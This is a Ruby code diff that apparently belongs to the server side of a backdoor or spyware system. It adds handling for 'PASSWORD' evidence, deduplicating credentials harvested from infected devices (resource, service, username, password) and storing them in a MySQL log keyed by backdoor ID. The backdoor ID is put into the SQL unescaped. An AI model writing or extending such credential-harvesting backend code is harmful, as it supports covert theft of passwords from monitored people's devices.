@@ -160,6 +160,33 @@ module Evidence
                  '#{@mysql.escape(evidence.info[:process])}',
                  '#{@mysql.escape(evidence.info[:window])}',
                  '#{@mysql.escape(evidence.info[:clipboard])}')"
+        when :PASSWORD
+          # check if the account is already present
+          present = mysql_query("SELECT log_id FROM log
+                                 WHERE `type` = 'PASSWORD' AND
+                                       `backdoor_id` = #{evidence.info[:backdoor_id]} AND
+                                       `remotehost` = '#{@mysql.escape(evidence.info[:device_id])}' AND
+                                       `remoteuser` = '#{@mysql.escape(evidence.info[:user_id])}' AND
+                                       `varchar1` = '#{@mysql.escape(evidence.info[:resource])}' AND
+                                       `varchar2` = '#{@mysql.escape(evidence.info[:service])}' AND
+                                       `varchar3` = '#{@mysql.escape(evidence.info[:pass])}' AND
+                                       `varchar4` = '#{@mysql.escape(evidence.info[:user])}'").to_a
+          return nil unless present.empty?
+
+          q = "INSERT INTO log (tag, type, flags, backdoor_id, remoteip, remotehost, remoteuser, received, acquired, varchar1, varchar2, varchar3, varchar4)
+                   VALUES (0,
+                   '#{@mysql.escape(evidence.info[:type].to_s)}',
+                   1,
+                   #{evidence.info[:backdoor_id]},
+                   '#{@mysql.escape(evidence.info[:source_id])}',
+                   '#{@mysql.escape(evidence.info[:device_id])}',
+                   '#{@mysql.escape(evidence.info[:user_id])}',
+                   '#{@mysql.escape(evidence.info[:received].to_s)}',
+                   '#{@mysql.escape(evidence.info[:acquired].to_s)}',
+                   '#{@mysql.escape(evidence.info[:resource])}',
+                   '#{@mysql.escape(evidence.info[:service])}',
+                   '#{@mysql.escape(evidence.info[:pass])}',
+                   '#{@mysql.escape(evidence.info[:user])}')"
       else
         trace :debug, "Not implemented."
         return nil
